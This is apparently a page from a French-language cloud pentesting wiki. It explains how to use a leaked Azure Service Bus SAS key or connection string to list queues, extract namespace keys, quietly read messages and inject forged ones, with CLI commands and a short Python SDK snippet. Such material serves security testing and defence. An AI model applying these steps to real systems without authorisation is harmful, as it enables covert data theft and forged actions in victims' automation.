---
title: "Service Bus : lire et injecter des messages de queue et de topic"
order: 1
description: "Lire et injecter des queues et topics Azure Service Bus via un accès SAS ou RBAC."
keywords:
  - Service Bus
  - queue
  - topic
  - SAS
  - injection de message
---

# Service Bus

Azure Service Bus relaie les messages entre composants applicatifs via des queues (point à point) et des topics (publish/subscribe). L'accès est accordé par une **shared access signature** adossée à une règle d'autorisation, ou par un rôle de données Azure RBAC. Une clé de namespace ou une connection string que vous récupérez (depuis les [app settings](../credentials/app-settings-and-connection-strings.md), un Key Vault ou les [assets Automation](../credentials/automation-assets.md)) permet de lire les messages en transit, d'injecter du travail forgé auquel un consommateur se fiera, ou de vider une queue pour casser le système derrière elle.

## Énumérer les accès

```bash
az servicebus namespace list -o table
az servicebus queue list --namespace-name <ns> -g <rg> -o table
# pull the SAS key behind an authorization rule
az servicebus namespace authorization-rule keys list \
  --namespace-name <ns> -g <rg> --name RootManageSharedAccessKey
```

Le `primaryConnectionString` porte un `SharedAccessKey` complet qu'un SDK client utilise directement, sans authentification supplémentaire.

## Lire et injecter

```bash
# with the connection string, peek or receive messages and send forged ones
# (Azure CLI has no data-plane send/receive; use the SDK or REST with the SAS token)
python - <<'PY'
from azure.servicebus import ServiceBusClient, ServiceBusMessage
c = ServiceBusClient.from_connection_string("<conn-str>")
with c.get_queue_receiver("<queue>", max_wait_time=5) as r:
    for m in r.peek_messages(10): print(bytes(m))          # read without locking
with c.get_queue_sender("<queue>") as s:
    s.send_messages(ServiceBusMessage('{"job":"forged"}'))  # inject
PY
```

## Notes d'exploitation

- `peek_messages` lit sans verrouiller ni compléter, donc le vrai consommateur les traite quand même et rien ne semble perdu.
- Un `RootManageSharedAccessKey` au niveau du namespace accorde l'accès à chaque queue et topic du namespace ; une seule connection string divulguée équivaut souvent à un accès total à la messagerie.
- Les queues qui pilotent de l'automatisation (provisioning, facturation, workers de déploiement) transforment un message forgé en action en aval.

## Outils

- **Azure CLI** (`az servicebus`) : énumération des namespaces, queues et clés.
- SDK Python **azure-servicebus** / **Service Bus Explorer** : lecture et injection côté plan de données.
- **MicroBurst** : fait ressortir les connection strings depuis les app settings et les assets Automation.

## Références

- [HackTricks Cloud : Azure Service Bus](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft : authentification SAS Service Bus](https://learn.microsoft.com/azure/service-bus-messaging/service-bus-sas)
